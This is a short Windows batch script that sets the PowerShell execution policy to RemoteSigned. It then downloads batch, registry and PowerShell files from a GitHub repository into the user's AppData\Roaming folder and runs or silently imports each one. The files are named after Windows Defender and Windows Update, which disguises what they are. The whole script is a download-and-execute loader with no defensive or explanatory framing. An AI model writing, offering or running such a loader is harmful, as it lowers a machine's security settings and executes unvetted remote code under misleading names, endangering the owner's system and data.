@echo off
powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/defender1.bat -O C:\Users\%username%\AppData\Roaming\defender1.bat"
cmd /c "C:\Users\%username%\AppData\Roaming\defender1.bat"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/defender2.bat -O C:\Users\%username%\AppData\Roaming\defender2.bat"
cmd /c "C:\Users\%username%\AppData\Roaming\defender2.bat"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate_r.reg -O C:\Users\%username%\AppData\Roaming\WindowsUpdate_r.reg"
regedit /s "C:\Users\%username%\AppData\Roaming\WindowsUpdate_r.reg"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate_Third.bat -O C:\Users\%username%\AppData\Roaming\WindowsUpdate_Third.bat"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate_Third.ps1 -O C:\Users\%username%\AppData\Roaming\WindowsUpdate_Third.ps1"
powershell.exe -File "C:\Users\%username%\AppData\Roaming\WindowsUpdate_Third.ps1"
